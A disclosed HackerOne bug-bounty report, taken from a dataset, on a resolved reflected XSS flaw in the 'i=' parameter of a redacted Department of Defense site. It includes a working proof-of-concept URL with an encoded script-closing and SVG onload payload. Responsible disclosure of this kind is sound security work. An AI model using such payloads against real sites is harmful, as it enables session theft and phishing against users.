---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '924650'
original_report_id: '924650'
title: Reflected XSS in https://www.██████/
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2020-07-15T16:43:59.627Z'
disclosed_at: '2020-09-29T20:34:27.623Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 21
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS in https://www.██████/

## Metadata

- HackerOne Report ID: 924650
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2020-09-29T20:34:27.623Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello Security Team,
I would like to report the XSS vulnerability on your system.
The `i=` parameter is not escaped properly for URL encoded values.

Steps To Reproduce:
Visit the following POC link:
https://www.████/ViewContent.aspx?con_id_pk=2726&fr=s&i=l9716%27();}]9836&001%3C%2FScript%2F%3E%3CSvg%2FOnLoad%3D(confirm)(1)%3E=1

1. Tested on firefox browser: █████████ 

2.Tested on google chrome browser: ██████████
Thanks
Niraj

## Impact

An XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, perform requests in the name of the victim, or for phishing attacks.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
